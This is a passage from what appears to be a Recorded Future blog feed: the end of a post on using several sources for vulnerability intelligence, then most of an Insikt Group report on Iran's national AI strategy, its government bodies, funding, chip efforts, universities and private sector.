vulnerabilities.

In fact, this is the very reason Recorded Future was formed as a company nearly 15 years ago. Centralized information sources need to be complemented by a distributed network of intelligence mirroring the world. This shift represents a new paradigm in how security intelligence flows:</p><h3 id="from-centralized-to-distributed">From Centralized to Distributed</h3><p>Organizations are moving away from reliance on single, authoritative sources toward networks of complementary intelligence.</p><h3 id="from-reactive-to-proactive">From Reactive to Proactive</h3><p>Multi-source intelligence enables earlier detection and faster response to emerging threats.</p><h3 id="from-generic-to-contextual-and-precise">From Generic to Contextual and Precise</h3><p>Diverse sources provide richer context, allowing for more precise risk assessment tailored to specific organizational environments.</p><h2 id="practical-steps-for-security-teams">Practical Steps for Security Teams</h2><p>For security professionals, this shift necessitates adjustments in vulnerability management workflows:</p><h3 id="diversify-cve-sourcing-for-vendor-risk-ratings">Diversify CVE Sourcing for Vendor Risk Ratings</h3><p>Recorded Future automates risk alerting and tracking, including CVEs by severity. Beyond MITRE NVD&#39;s CVSS scores, we incorporate proprietary and open source scoring and data.

It is very likely that additional community and open sources will emerge to expose and track this information, which will be great incremental sources. Organizations that leverage platforms capable of aggregating, normalizing, and contextualizing intelligence from multiple sources gain significant advantages in risk identification, prioritization, and mitigation. They are also more protected from disruptions related to any one particular source. This is supply chain management 101. </p><p>Even better is when the platform can automate and proactively take action based on a wide variety of intelligence sourcing. As information supply chains continue to evolve, the most resilient security postures will belong to those organizations that embrace multi-source intelligence platformsensuring that when one source experiences disruption, the flow of critical security intelligence and automation continues uninterrupted. </p><p>Recorded Future will continue help on this mission in every way we can. In addition to CVE information, we track over 4,000 threat actors, including 430 nation-state sponsored groups, and a variety of other sources of threats used in our analysis and recommendations. We actively monitor more than 90,000 command and control servers while scanning 30 million domains and URLs each day. We make some of this available for free in our public vulnerability database site, where you can see trending vulnerabilities and search for CVEs and software: <a href="https://www.recordedfuture.com/vulnerability-database" target="_blank">https://www.recordedfuture.com/vulnerability-database</a></p><p><img src="https://cms.recordedfuture.com/uploads/mitre_cve_006_ba6e6ce748.png" alt="mitre-cve-006.png"></p>]]></content:encoded>

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>Iran recognizes the vital role artificial intelligence (AI) will play in its future economic viability, regional influence, and national security and has begun to implement a top-down effort to achieve regional technological competitiveness. Since the Supreme Leader issued a directive in 2021, Iran has endeavored to develop a national strategy and oversight mechanism for AI and foster a technological ecosystem to drive domestic research and development. However, two key factors  Tehrans global economic isolation, and its deeply entrenched system of government control and oversight  have almost certainly hindered Irans national AI development. </p><p>In 2024, as Tehrans support for its proxies Hamas and Hezbollah against Israel embroiled Iran in unprecedented regional conflicts and ongoing cyberwarfare, new insights emerged about how Iran has implemented AI technologies in its national security apparatus. Iran has used AI to bolster its capabilities in four main areas: cyberattacks, influence operations, military and intelligence systems, and domestic repression. These priorities will continue to propel Irans development and implementation of AI, almost certainly posing an increasing threat to Irans Western and regional adversaries. In cyberspace, AI will likely augment Iranian threat actors spearphishing and social engineering tradecraft, while AIs implementation in Irans drone and missile arsenal is likely to pose the greatest physical threat from emerging technology.</p><p>Irans approach to AI will likely mirror its broader strategic ambitions  to be a regional power and assert its national sovereignty  by building and implementing advanced technological capabilities. Iranian government initiatives are likely to be the driving force behind Irans AI development priorities, particularly given the absence of a flourishing AI private sector. While Tehran will promote its own technological prowess and indigenous AI development, the Iranian government is likely to leverage its relationship with China and Russia in various security realms to bolster its AI technology capabilities. Private industry, particularly companies in the AI or technology resources industry, should closely monitor end users of their models or materials to ensure Iranian threat actors are not using their products or acquiring controlled technologies. Similarly, governments should invest in identifying and preventing the Iranian defense industry from acquiring AI technologies that enhance its military capabilities. </p><h2 id="key-findings">Key Findings</h2><ul><li>Iran has articulated lofty goals for its AI advancement and seeks to compete in the global AI race, but it is almost certainly hindered by two factors: First, its economic and commercial isolation limits its access to technological resources and human capital. Second, its top-down government control and oversight stifles private innovation in AI.</li><li>To augment its own indigenous research and development (R&amp;D) capabilities in AI, Iran will likely leverage its bilateral and regional relationships for technology engagement with China, Russia, and other non-Western countries.</li><li>Amidst unprecedented domestic upheaval and regional conflict over the last three years, Iran very likely views AI as a key force multiplier for its national security and defense and has sought to integrate AI into its cyber and influence operations, military systems, and domestic surveillance infrastructure.</li><li>It is very likely that Iranian threat actors will increasingly use generative AI and large language models (LLMs) to enhance their influence and cyber operations, increasing risk to adversarial governments, as well as their critical infrastructure, technology companies, and other security-related industries. </li><li>Iran has very likely endeavored to implement AI in its military defense systems and publicly touts the capability, though its operational uses of the technologies remain unproven.</li><li>In the domestic sphere, Iran has very likely increased its efforts to deploy AI for morality enforcement and opposition monitoring, to enhance its control over Iranian society, particularly after the Woman Life Freedom protest movement.</li><li>Companies and governments should maintain vigilance in cybersecurity practices to reduce vulnerabilities to AI-enabled cyber and influence operations and limit Irans access to AI resources and expertise that could increase Tehrans threat to regional security.</li></ul><h2 id="irans-ai-ambitions">Irans AI Ambitions</h2><p>At the highest level of its leadership, Iran has recognized and sought to develop an overarching national focus on AI (   in Persian). In November 2021, Supreme Leader Ali Khamenei called AI an important and futuristic issue that will play a role in the future administration of the world, and <a href="https://www.memri.org/reports/irans-supreme-leader-khamenei-we-must-master-all-layers-artificial-intelligence-technology" target="_blank">urged</a> Iran to become a top ten country in the field of AI. In August 2024, Khamenei urged Iran to master and develop the deep and diverse layers of AI technology, warning that a global oversight body (similar to the International Atomic Energy Agency [IAEA]) might regulate its use in the future. Khameneis stated ambition for Irans AI prominence initiated a flurry of government-led activity to develop and implement a national strategy and technological ecosystem to align with the Supreme Leaders intent. Iran subsequently began creating a national AI roadmap that evaluated the strategic documents of 23 countries in the field of AI and developed a plan to realize Khameneis goal by 2032. The goals of the roadmap document were to achieve 80 percent of research to meet the needs of the country, use of 45 percent of AI in industries, $8 billion investment in AI, and a 12 percent share of AI in the GDP.&quot; The document contained fourteen macro policies, 47 micro-policies, 39 general actions, and 155 projects and activities. According to the roadmap, by the Persian year 1410 (starting March 2031), Iran would need to train 600,000 experts in the AI field to accomplish these objectives.</p><p>Irans presidency  specifically, the Vice Presidency for Science, Technology and Knowledge-based Economy  oversees the Iranian governments effort to establish and implement an AI strategy. On December 3, 2023, President Ebrahim Raisi issued an executive order to establish the National Steering Committee and the National Artificial Intelligence (AI) Center, which would focus on creating integrated AI processing and data service providers, aligning with the countrys needs, and implementing large-scale AI projects.&quot;  He appointed Reshad Hosseini as Secretary for the Development of Artificial Intelligence and Robotics Headquarters, a role intended to develop a technology development roadmap and to make maximum use of all the internal capacity of the innovation ecosystem.&quot; Irans AI Strategic Council was to be formed of ministers and heads of relevant institutions to implement, coordinate, and monitor a National AI Document.</p><p>After Raisis death in May 2024, the administration of President Masoud Pezeshkian has continued to emphasize Irans AI strategy. The National AI Organization (or the National Organization for AI) was inaugurated in July 2024 in Tehran. Insikt Group identified the organizations physical location in north central Tehran, on Molla Sadra Street (Figures 1-3). During Pezeshkians endorsement ceremony and National Government Week meeting in August 2024, Khamenei advised the new administration that the good initiative begun under deceased President Raisi unfortunately remains unfinished, but advised that the National AI Organization, under the direct supervision of the President, should continue Raisis progress. On October 15, 2024, Irans Information Technology Council issued a decision that within two months, the National Organization of Artificial Intelligence should present to the working group the requirements for creating, developing, maintaining and publishing data and information in the hyper scale database of artificial intelligence.&quot; </p><p>Pezeshkian appointed Hossein Afshin, a professor of mechanical engineering at Sharif University of Technology, as his Vice President for Science, Technology, and Knowledge-based Economy, who also serves as the secretary and vice president of the National AI Organization and serves as the face of AI development within Iran. Pezeshkian also assigned his First Vice President, Dr. Mohammad Reza Aref, as chairman of the National AI Organization and its strategic council. Arefs appointment as First Vice President <a href="https://amwaj.media/en/media-monitor/critics-slam-return-of-lord-of-silence-as-iran-s-first-vice-president" target="_blank">prompted</a> criticism for his political obscurity, likely reflecting Pezeshkians choice for the position was based on his scientific prowess and technical acuity rather than his accomplishments as a reformist politician. The prominent role of Aref  who holds two advanced degrees in electrical engineering from Stanford University, has been a professor at two prestigious Iranian universities, and has <a href="https://ieeexplore.ieee.org/author/37300306900" target="_blank">published</a> scholarly articles on information technology  as Pezeshkians deputy with oversight of the countrys AI program suggests an increasing recognition of the importance of AI.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_001_6bd6d1d62b.png" alt="iran-ai-001.png"><em><strong>Figure 1:</strong> Inauguration of Irans National Artificial Intelligence Organization in Tehran (Source: Mehr News)</em></p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_002_dc5f600753.png" alt="iran-ai-002.png"><em><strong>Figure 2:</strong> Exterior of the National Artificial Intelligence Organization (Source: <a href="https://maps.app.goo.gl/GN4RRv5iSHZNqmbT7" target="_blank">Google Maps</a>)</em></p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_003_023523ac12.png" alt="iran-ai-003.png"><em><strong>Figure 3:</strong> Location of the National Artificial Intelligence Organization (Source: <a href="https://maps.app.goo.gl/GN4RRv5iSHZNqmbT7" target="_blank">Google Maps</a>)</em></p><h2 id="laying-the-foundations-of-an-ai-ecosystem">Laying the Foundations of an AI Ecosystem</h2><p>Insikt Group examined Iranian government statements, press releases, leadership speeches, academic journals, industry websites, and news media, all of which provide key insights into the development and deployment of AI in Iran. However, these sources often provide broad knowledge about Irans ambitions or intentions regarding AI and lack details on the specific models, technology, or deployment of AI in support of national security objectives. Western AI companies, such as OpenAI, Google, and Microsoft, as well as global cybersecurity and military experts, offer additional perspectives and analysis of Irans AI use cases.</p><h3 id="national-ai-strategy-development-and-challenges">National AI Strategy Development and Challenges</h3><p>Following its leaders 2021 directive, the Islamic Republic has striven to develop and integrate AI through the establishment of various bureaucratic entities and industry initiatives. Irans progress in AI advancement is almost certainly limited by two factors: (1) its economic and commercial isolation and (2) its government control and oversight. After years of international sanctions and commercial isolation, Irans technological advancement, particularly in security-related industries such as defense, energy, and maritime shipping, depends on indigenous and domestically engineered capabilities.  Iran <a href="https://www.atlanticcouncil.org/blogs/iransource/iran-s-troubled-quest-for-food-self-sufficiency/" target="_blank">strives</a> for self-sufficiency in various sectors, including food and energy, and this concept of a resistance economy, which <a href="https://www.washingtoninstitute.org/policy-analysis/khamenei-attempts-restore-optimism-and-normality-nowruz-speeches" target="_blank">underpins</a> Iranian strategic culture and economic development priorities, very likely shapes the development of Irans AI ecosystem. The Iranian government almost certainly <a href="https://www.cambridge.org/core/journals/iranian-studies/article/artificial-intelligence-in-iran-national-narratives-and-material-realities/9D2C33F3F1BC459712651443F1D203FB" target="_blank">disseminates</a> the narrative that Iran is a competitor in an AI global race and seeks to prove its technological prowess. As a result of Irans national ambitions for AI, its development ecosystem is very likely government-driven, in partnership with private industry and academia. Iranian technological leaders very likely understand that foreign advances in AI computing power, including private technology companies, can both benefit and augment Irans own internal efforts and uses. This dynamic  a top-down national strategy and AI technical development framework that is supported rather than driven by Irans own private sector innovation  is likely to limit the potential of Irans AI advances.</p><p>Irans own private sector innovation is likely stifled by its economic isolation and its dependencies on government funding and direction. Iran claims that the governments expanded support to the tech sector resulted in a surge of Iranian venture capital firms, accelerators, and innovation centers between 2019 and 2020, as these firms provided localized solutions amid global supply chain disruption (after the US withdrew from the Iran nuclear agreement and re-imposed sanctions).  However, according to a 2022 United Nations <a href="https://www.undp.org/publications/mapping-existing-innovation-ecosystem-ir-iran" target="_blank">report</a> on Irans innovation landscape, sanctions significantly hampered Irans startup ecosystem and the domestic and foreign appetite for investments in Iranian technology startups after 2018 was reduced substantially. Irans challenges and limitations are reflected in several global indices that analyze and measure AI advances and technological innovation across countries. Stanford Universitys Global AI Vibrancy Tool, which <a href="https://hai-production.s3.amazonaws.com/files/global_ai_vibrancy_tool_08.27.24.pdf" target="_blank">defines</a> AI vibrancy as the level of activity, development, and impact of AI technologies within a country, does not include Iran in its analysis of 36 countries leading AI-related metrics. Iran is ranked 64th in the Global Innovation Index, which <a href="" target="_blank">reflects</a> a notable improvement over the last ten years. However, Irans institutional, regulatory, and business environments ranked 127th, 131st, and 128th, respectively, underscoring the systemic challenges to Irans innovation ecosystem. Oxford Insights <a href="https://www.wipo.int/web-publications/global-innovation-index-2024/assets/67729/2000%20Global%20Innovation%20Index%202024_WEB3lite.pdf" target="_blank">ranked</a> Iran 91st of 193 countries in the 2024 Government AI Readiness Index, a three-position improvement from its 2023 ranking, but scored lowest in the vision, adaptability, and maturity dimensions.</p><p>In 2022, Iran revealed fifteen policies shaping its AI development roadmap. A key theme underpinning these policies was the importance of national research centers, private industries, and universities working together to advance Irans AI development. Notably, two of the policies sought to support the private industrys use of academic plans and to increase private industrys trust in universities, likely suggesting a divide between Irans technical industry and its academic institutions. Another key theme of the policies was increasing foreign engagement and cooperation between Iranian and foreign academic centers. This likely reflects Irans interest in leveraging foreign partnerships, particularly with countries that are adversarial to the West, in the AI field.</p><p>In July 2023, a study from the Journal of Science &amp; Technology Policy found that the artificial intelligence ecosystem in [Iran] has not yet taken shape in the true sense and there is still no relative consensus among actors for dividing tasks and missions.&quot; Less than a year later, the same journal  which is affiliated with Irans National Science Policy Research Center  published a Nowruz 1403 (Persian new year, corresponding with March 2024) special edition entitled Generative Artificial Intelligence: Multiple Perspectives on Opportunities, Challenges, and Implications in Research, Practice, and Policymaking that examined the abundant ethical and legal opportunities and challenges of AI, specifically ChatGPTs practical, ethical, semantic, and policy challenges.&quot; The studys conclusion highlighted the lack of well-developed ethical guidelines and noted that it is vital that new rules be established to govern these instruments, and given their global nature, international coordination is also necessary to maximize their benefits. The 43 expert authors from various business and technological fields disagreed about whether ChatGPT should be restricted or legalized in Iran.</p><p>Irans bureaucratic challenges in the AI realm, including changes in presidential administrations and a plethora of organizational stakeholders with overlapping responsibilities, likely limit the countrys ability to implement an overarching strategy for its AI development. Tehrans policy toward AI is overseen by Irans Supreme Council of the Cultural Revolution (SCCR)  a strategic policy body that answers only to the Supreme Leader  whose approval in June 2024 was required to move forward with the National AI Organization, steering council, and the documents generalities. This approval involved review of the AI organizations statutes and 18,000 supporting documents to ensure the project was not tainted by Western influence. The SCCR established a specialized Commission for AI in September 2022 composed of officials from all armed forces branches, the General Staff of the Armed Forces, the Office of the Supreme Leader, the Ministry of Intelligence, and the Ministry of Higher Education. In January 2025, Pezeshkian noted the importance of AI development in a meeting with the SCCR, asserting that any delay or backwardness in the development of AI in Iran would be damaging and irreparable. Domestic critics of Irans AI policy have raised concerns about the unstable decisions, constant policy changes, and lack of a clear roadmap that has hampered the countrys AI program. For example, in December 2024, Afshin announced that the cabinet was drafting a charter for the National AI Organization that would focus on the organizations role in planning and overseeing AI activities; three months later, semi-official news agency Tasnim News suggested the possibility that the National AI Organization could be dissolved, raising a series of contradictions and unanswered ambiguity.  </p><h3 id="ai-budget">AI Budget</h3><p>Documentation of Irans investment and funding of AI is opaque, but even with conflicting information, Irans lack of significant AI funding compared to its competitors will likely imperil its top-ten AI ambitions. The SCCR reportedly allocated a budget totaling 3.5 trillion Tomans (over 83 million dollars) in its approval; Irans initial operating budget for AI has also been reported as $50 million USD.  According to the Tehran Times, 50 trillion rials (some $100 million) has been allocated for the development of AI operators during Persian year 1403 (between March 2024 and March 2025). In January 2025, Irans National Development Fund  independent of the Iranian government budget  agreed to allocate $15.6 million USD to AI projects in universities and private research centers, while another $100 million USD will be provided in the form of loans. These funding numbers lag significantly behind the AI budgets of regional competitors like the United Arab Emirates (approximately $1.2 billion USD) and Saudi Arabia (approximately $2 billion USD). </p><h3 id="government-entities">Government Entities</h3><p>Insikt Group identified a number of government entities that are involved in the direction, strategic planning, and national coordination for the development of Irans AI capabilities. The protracted process for the formulation of Irans national AI strategy document, which has <a href="https://ideaagency.net/irans-advancements-in-ai-collaboration-on-national-strategy/" target="_blank">involved</a> a cross-agency collaboration process with multiple stakeholders, likely reflects a bureaucratic competition for influence and ownership of AI leadership within the Iranian government. The division of power among various government elements has likely hampered Irans ability to form a cohesive AI strategy and development plan.</p><table><tbody><tr><td><strong>Organization</strong></td><td><strong>Role in AI Development</strong></td></tr><tr><td>Supreme Council of the Cultural Revolution (SCCR)</td><td><ul><li>Created following the 1979 Islamic Revolution to ensure Iran&rsquo;s higher education system adhered rigorously to Islamic Revolution ideals</li><li>Approves Iran&rsquo;s national AI documents and organization</li><li>Established a Commission for AI and Cyberspace among its &ldquo;specialized committees</li><li>Likely aims to preserve Iran&rsquo;s culture and religious ideals in the development of AI, given its original mandate</li></ul></td></tr><tr><td>Vice Presidency for Science, Technology and Knowledge-based Economy</td><td><ul><li>Established in 2006 with the SCCR&rsquo;s approval &ldquo;to support and strengthen the scientific and research activities of elites&rdquo; and to develop national strategic and prioritized technologies</li><li>Tasked by the Iranian president &ldquo;to interact with AI specialists in universities, research centers and Parliament&rdquo; to study &ldquo;different dimensions of AI,&rdquo; &ldquo;with the aim of adopting policies and formulating laws</li><li>Likely plays a critical role in implementing Khamenei&rsquo;s vision and directing resources for Iran&rsquo;s AI advancement, driving cooperation among technological experts on national AI-related projects and initiatives</li></ul></td></tr><tr><td>National Artificial Intelligence Organization (or National Organization for AI)</td><td><ul><li>Under the supervision of the Iranian President</li><li>Launched in July 2024, after SCCR&rsquo;s approval of statutes and 18,000 supporting documents</li><li>Tasked with &ldquo;implementing a national AI strategy&rdquo; and &ldquo;to provide sufficient resources, with support from the National Development Fund, to create the necessary infrastructure&rdquo; and &ldquo;support private companies in developing advanced AI models and algorithms</li><li>Aims to &ldquo;plan and oversee AI activities rather than directly intervene</li></ul></td></tr><tr><td>Ministry of Information and Communications Technology (ICT)</td><td><ul><li>Considered to be the &ldquo;executive core of artificial intelligence&rdquo; in Iran</li><li>A subsidiary, the Information Technology Organization of Iran, is responsible for &ldquo;facilitating e-services delivery&rdquo; and &ldquo;to develop and maintain the country&rsquo;s national information exchange center&rdquo;</li></ul></td></tr><tr><td>ICT Research Institute (Formerly ITRC)</td><td><ul><li>Established in 1970 at the University of Tehran</li><li>Serves as the main research arm for ICT nationwide, while &ldquo;customizing and channelizing advanced information technology at industry level</li></ul></td></tr><tr><td>Artificial Intelligence Innovation and Development Center</td><td><ul><li>Under the oversight of the ICT Research Institute</li><li>Involved in &ldquo;planning, executing the evaluating and providing quality assurance certification for AI products and services&rdquo;</li><li>Includes specialized &ldquo;laboratories&rdquo; for the development and evaluation of AI products and services, including machine vision and image processing, text and natural language processing, speech and audio processing, biometrics, data processing, and cognitive science</li></ul></td></tr><tr><td>National Cyberspace Center</td><td><ul><li>Monitors and directs the activities of various organizations, including the Vice Presidency&rsquo;s efforts &ldquo;for employing innovative technologies in the virtual space, such as artificial intelligence, blockchain, quantum computing, and data science</li></ul></td></tr></tbody></table><p><em><strong>Table 1:</strong> Iranian entities involved in AI strategy (Source: Recorded Future)</em></p><p>Irans military plays a key role in technological developments through civil-military cooperation, which very likely extends into the AI realm. Iranian armed forces, including the Islamic Revolutionary Guard Corps (IRGC), have <a href="https://cira.exovera.com/research-analysis/irgcs-involvement-in-science-technology-parks-blurs-line-between-civilian-military/" target="_blank">affiliated</a> universities and science and technology (S&amp;T) parks and run their own technology parks as incubators. For example, Imam Hossein University  affiliated with the IRGC  has a technology center and hosted The International Conference on Artificial Intelligence and the Future Civilization on January 29, 2025. Irans military branches from the Army and IRGCs ground, naval, and air forces each have their own research and development entity, <a href="https://link.springer.com/chapter/10.1007/978-3-031-58649-1_19" target="_blank">referred</a> to as a Research Self-Sufficiency and Jihad Organization (RSSJO), that conducts specialized and tailored R&amp;D for the unique needs of their respective forces. These RSSJOs are likely involved in independent efforts in defense-related R&amp;D and in cooperation with academic institutions; they are likely integrating AI development into those efforts. Irans Ministry of Defense and Armed Forces Logistics (MODAFL) also likely has a key role in defense-related AI development, having signed partnership agreements with 80 universities and 800 industrial towns in Iran.</p><h3 id="government-initiatives">Government Initiatives</h3><p>Announcements by the Vice Presidency for Science, Technology and Knowledge-based Economy regarding its AI development initiatives likely suggest Iran is working to develop a sovereign AI capability  meaning an Iranian national capability to <a href="https://aimagazine.com/articles/what-is-sovereign-ai-and-why-is-it-gaining-traction" target="_blank">produce</a> AI using its own infrastructure, data, workforce, and business networks through the development of foundation models trained on local datasets that reflect local language and culture. Hossein Afshin, Irans Vice President for Science, Technology and Knowledge-based Economy, hosted a meeting with the Technology Group from Tarbiat Modarres University on December 1, 2024, during which he reviewed the teams progress, requirements, and support mechanisms for its Project for Designing a Large Native Iranian Language Model. He subsequently announced on December 3, 2024, that a prototype of Irans national AI operating system, which was designed to host AI algorithms locally, was expected in six months. Iran intends to launch the countrys first GPU data center by 2025 and plans to establish its first AI park  to showcase the technological developments of the country and provide practical AI-related services to the people  within the next two years.</p><p>On March 15, 2025, Vice President Afshin unveiled Irans national AI platform and announced a phased rollout of the project, framing it as a strategic move in a global war of chips and algorithms. The platforms initial testing and optimization are planned for the first half of 2025, followed by limited access for technology experts and companies in the third quarter, a public beta release in September 2025, culminating with a public release in approximately March 2026. Over 100 Iranian professors and researchers collaborated on the project, which was developed in cooperation with Sharif University of Technology  an institution that is <a href="https://www.opensanctions.org/entities/NK-nxBVUwhmE8JFVPkiVzKVaS/" target="_blank">sanctioned</a> for its links to the IRGC and MODAFL related to military and ballistic missile technology development.  An expert developer and representative of Sharif University, Hossein Asadi, noted that the AI platform was developed using an open-source framework and specifically highlighted that it would be entirely independent, with no reliance on foreign APIs [application programming interfaces], ensuring the platforms services would continue without disruption even if the countrys internet were to be completely disconnected.</p><p>Iran almost certainly seeks to leverage domestic resources to support these development initiatives. On December 13, 2024, Afshin declared the governments intention to jumpstart domestic chip production for AI through the Sahand National Project (  ). The Sahand National Project is consistent with Irans focus on leveraging its own human and natural resources to deliver indigenous technological solutions and is likely a reaction to an anticipated increase in economic isolation under the US presidential administration of Donald Trump. The US government <a href="https://bidenwhitehouse.archives.gov/briefing-room/statements-releases/2025/01/13/fact-sheet-ensuring-u-s-security-and-economic-strength-in-the-age-of-artificial-intelligence/" target="_blank">announced</a> export restrictions on January 13, 2025, which are designed to curtail the sale of chips with high-computational graphics processing unit (GPU) power for AI advanced development (such as Nvidias A100 and H100 chips) to sanctioned countries like Iran. </p><p>According to Iranian media, the projects aim is to manufacture nine-nines (99.9999999%) purity silicon wafers, the first step in setting up a domestic supply chain for microchips, with a view to open Irans first GPU data center by early 2025. While public information on the project remains limited, its reported location  in Sahand, East Azerbaijan province  would likely have been chosen for its proximity to <a href="https://www.crunchbase.com/organization/sahand-industrial-group" target="_blank">Sahand Industrial Group</a> (SIG), Irans leading glass and silica producer, and the Sahand University of Technology, which has specialized laboratories in material and nanomaterial engineering. Using satellite imagery, Insikt Group identified a new two-million-square-foot facility under construction near an existing SIG silica manufacturing plant in Sahand, showing significant investment in the regions industrial capabilities.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_004_ab2b738eab.png" alt="iran-ai-004.png"><em><strong>Figure 4:</strong> Satellite imagery of a two-million square foot facility between May 2020 and May 2024 near an SIG silica plant in Sahand, East Azerbaijan, Iran (Source: <a href="https://earth.google.com/web/@37.98555449,46.05734324,1318.43207051a,2331.38762272d,35y,356.98663711h,0t,0r/data=ChYqEAgBEgoyMDIwLTA1LTEzGAFCAggBMikKJwolCiExRjlFYTB2c1g5MUJONlFrSGlxZUlYTTZKckFvSEpWcGQgAToDCgEwQgIIAEoICJag4dgDEAE" target="_blank">Google Earth</a>)</em></p><p>Another government initiative announced on January 11, 2025, by Afshin aims to establish a hub for AI innovation in the oil and gas industries on Kish Island, Southern Iran, in association with the Persian Gulf Petrochemical Industries Company and the Kish Free Zone Organization. The location choice likely enables the Iranian government to unlock three benefits for the acceleration of AI development: the Kish Free Zones lax foreign investment and fiscal policies to encourage foreign direct investments (FDI); existing infrastructure, including an international airport and ports that can be leveraged for international transit; and lax entry visa requirements on Kish Island that <a href="https://travel.state.gov/content/travel/en/international-travel/International-Travel-Country-Information-Pages/Iran.html" target="_blank">enable</a> reputable Iranian academic institutions (such as Sharif University of Technology, which has an international campus in Kish) to attract foreign talent and investment.</p><p>Iran has announced several AI-enabled tools for the benefit of the Iranian government and society. Alongside his announcement of Irans domestic chip production project in December 2024, Afshin also declared that the Iranian government has prioritized the development of AI assistants available to government officials, developed in collaboration with universities with a team of over 70 expert professors. The AI assistants are reportedly expected to help government ministers to extract both laws and regulations and production-related issues from data and make suggestions in decision-making. In August 2024, Irans National Cyberspace Center announced the Arbaeen Artificial Intelligence Assistant (which references Arbaeen, a Shiite holy day, during which Shia Muslims <a href="https://www.newarab.com/features/explainer-what-arbaeen" target="_blank">make</a> a pilgrimage to Iraq) was a guide for pilgrims to access routes and processions, management of information for scheduling ceremonies and events, as well as the status of health and medical services, weather conditions, and even cultural and linguistic guidance online. In November 2024, Irans national religious headquarters, located at Qom Seminary, launched an indigenously developed platform that uses AI to answer questions and remove doubts on religious issues. Dubbed Deendaan, the platform was introduced by the seminarys National Center for Answering Religious Questions. Another entity in Qom, the Noor Computer Centre for Islamic Sciences Research, is seeking to <a href="https://archive.is/npvsM#selection-2349.43-2349.93" target="_blank">incorporate</a> AI in its use of religious texts and data to accelerate the Islamic studies of senior clergy and speed up their communication to the public. </p><h3 id="academia">Academia</h3><p>Irans most globally recognized AI innovation, the Surena IV humanoid robot, was developed by Irans academic sector, underscoring the key role of universities and research institutes in Irans AI ecosystem. Created at the Center of Advanced Systems and Technologies (CAST) at the University of Tehran, the robots fourth generation uses the Robot Operating System for state monitoring, real time implementation of algorithms, and simultaneous running of several programs. The robot was <a href="https://www.asme.org/topics-resources/content/10-humanoid-robots-of-2020" target="_blank">listed</a> as one of the top ten humanoid robots in 2020, according to the American Society of Mechanical Engineers. In addition to developing the Surena humanoid, CAST has a portfolio of projects related to various fields, including mechatronics, robotics, and intelligent systems inspired by nature, as well as aquatic inspired robots and those inspired by birds.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_005_ab855d70a9.png" alt="iran-ai-005.png"><em><strong>Figure 5:</strong> Surena IV, developed at the University of Tehran (Source: <a href="https://spectrum.ieee.org/iran-surena-iv-humanoid-robot" target="_blank">IEEE</a>)</em></p><p>Leading Iranian universities in the field of AI <a href="https://edurank.org/cs/ai/ir/" target="_blank">include</a> the University of Tehran, Amirkabir University of Technology, and Iran University of Science and Technology, all located in Tehran. According to the state-run news outlet Tehran Times, over the last ten years, the most scientific productions in artificial intelligence have been associated with Tehran University, Tabriz University, and Amirkabir University of Technology. However, these universities likely remain low on global rankings for AI research; the University of Tehran, widely recognized as the best higher education institution in Iran, <a href="https://edurank.org/uni/university-of-tehran/rankings/" target="_blank">ranks</a> at number 201 globally for AI. Edurank data suggests that Irans top three universities are ahead or on par with their Russian peers (Moscow State University, St. Petersburg State University, and the National Research University) but far behind China (Tsinghua University, Harbin Institute of Technology, and Shanghai Jiao Tong University) in terms of production (number of publications) and influence (number of citations). Iranian national investment in AI research is likely less than Russian investment, but its academic citation numbers are greater than Russias, likely reflecting that Irans AI academics maintain disproportionate influence in their field relative to their Russian counterparts.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_006_8ad8b5bb07.png" alt="iran-ai-006.png"><em><strong>Figure 6:</strong> Top three universities in Iran, Russia, and China by papers and citations in the field of AI (Source: <a href="https://edurank.org/cs/ai/" target="_blank">Edurank</a>)</em></p><p>In the absence of a vibrant private AI sector, the Iranian government is likely reliant on academics specialized in AI for government projects at the expense of cutting-edge research. Iranian media boasted that 70 expert professors were working to design an AI platform for government ministers. Sharif University of Technology, ranked fourth in Iran in AI, is likely a key partner for government projects, such as Irans national AI platform. The government demand for expertise likely represents a misallocation of research talent towards state-mandated engineering projects, which likely impedes Irans research potential. However, Iranian academic centers may also be exploring open-source AI development, which likely encourages innovation. For example, in November 2024, Amirkabir University, in collaboration with AI developer Part AI, announced the development of the most comprehensive and powerful evaluation system for Persian language models, known as <a href="https://huggingface.co/spaces/PartAI/open-persian-llm-leaderboard" target="_blank">Open Persian LLM Leaderboard</a>, which includes over 40,000 samples and tracks the performance of 25 major open-source models at Persian-language tasks. Part AI has also published six open-source models, including Persian finetunes of Metas Llama 3.1 and Googles BERT models.</p><p>A search of recent and upcoming conferences related to AI suggests Irans academic sector is exploring AI applications in several sectors, including medical sciences, telecommunications, electrical engineering, education, mining, and industry. In 2024, Iran held a number of inaugural national conferences on specific topics, very likely suggesting the concept of how AI can benefit specific industrial sectors is still nascent in Iran. For example, in October 2024, Iran held the first national conference on AI in education and learning; in May 2024, Iran held its first national conference on AI and the Internet of Things; in April 2024, it held its second national conference on Digital Transformation and Intelligent Systems.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_007_cc46a37180.png" alt="iran-ai-007.png"><em><strong>Figure 7:</strong> Poster of international AI conference which notes the cooperation with prestigious universities and scientific centers of Iran and the world (Source: Imam Hossein University)</em></p><p>Iranian universities are very likely driving international engagement by hosting conferences on AI. A review of international AI-related conferences held in Iran in 2024 and planned for 2025 highlights a wide range of foreign academic participants, including academics from Austria, Australia, Canada, China, France, Italy, Iraq, Malaysia, Russia, Spain, Vietnam, and the United Kingdom.   Iranian academic output on AI likely benefits from strong ties with Iranian-American researchers and collaboration with US academic institutions. An Iranian study of domestic output of AI research between 1978 and 2022 found that US researchers were the most frequent international co-authors on Iranian AI research. However, Iranian academic AI research likely remains of limited international influence. 19.9% of Iranian AI papers during this period received no citations, with the majority receiving between one and five citations.</p><p><img src="https://cms.recordedfuture.com/uploads/iran_ai_008_803597413b.png" alt="iran-ai-008.png"><em><strong>Figure 8:</strong> Network map of countries co-authoring with Iranian AI researchers between 1978 and 2022, based on the Scopus database (Source: Shahed University)</em></p><h3 id="private-technology-companies">Private Technology Companies</h3><p>Irans private sector currently faces significant challenges in the face of international sanctions and lack of global competitiveness, including the inability to retain top talent, the absence of 